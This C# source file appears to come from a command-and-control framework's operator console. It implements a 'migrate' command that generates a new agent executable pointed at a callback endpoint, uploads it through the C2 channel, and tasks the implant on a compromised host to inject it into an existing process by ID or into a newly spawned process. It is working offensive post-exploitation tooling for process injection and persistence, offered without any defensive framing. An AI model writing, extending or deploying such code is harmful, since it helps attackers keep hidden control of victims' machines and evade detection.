using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using Commander.Models;
using Commander.Commands.Agent;
using Common;

namespace Commander.Commands.Laucher
{
    public class MigrateCommandOptions
    {
        public string endpoint { get; set; }
        public bool debug { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }

        public string processName { get; set; }

        public int? processId { get; set; }
    }
    public class MigrateCommand : EnhancedCommand<MigrateCommandOptions>
    {
        public override string Category => CommandCategory.Commander;
        public override string Description => "Migrate the current agent to another process";
        public override string Name => "migrate";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Option<int?>(new[] { "--processId", "-pid" }, () => null, "id of the process to injects to"),
            new Option<string>(new[] { "--processName", "-p" }, () => null, "name of process to spawn"),
            new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<MigrateCommandOptions> context)
        {
            if (!context.Options.processId.HasValue && string.IsNullOrEmpty(context.Options.processName))
            {
                context.Terminal.WriteError($"[X] Migrate Command requires either a processId or a processName");
                return false;
            }

            var agent = context.Executor.CurrentAgent;
            if (string.IsNullOrEmpty(context.Options.endpoint))
            {
                context.Terminal.WriteLine($"No Endpoint selected, taking the current agent enpoint ({agent.Metadata.EndPoint})");
                context.Options.endpoint = agent.Metadata.EndPoint;
            }

            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            string id = ShortGuid.NewGuid();
            string outFile = Path.Combine("/tmp", "tmp" + id);

            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".exe";

            context.Terminal.WriteLine($"[>] Generating binary...");

            var executionResult = BuildHelper.GenerateBin(fileName, outFile, context.Options.x86, endpoint.ToString());

            fileName = outFile;

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);
            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.Terminal.WriteSuccess($"[+] Generation succeed!");


            if (!File.Exists(fileName))
            {
                context.Terminal.WriteError($"[X] File {fileName} does not exists!");
                return false;
            }


            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(fileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            context.Terminal.WriteLine($"Preparing to upload the file...");

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, fileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            File.Delete(fileName);


            if (context.Options.processId.HasValue)
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId.Value}");
            else
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");

            context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file and migrate.");

            return true;
        }
    }

}
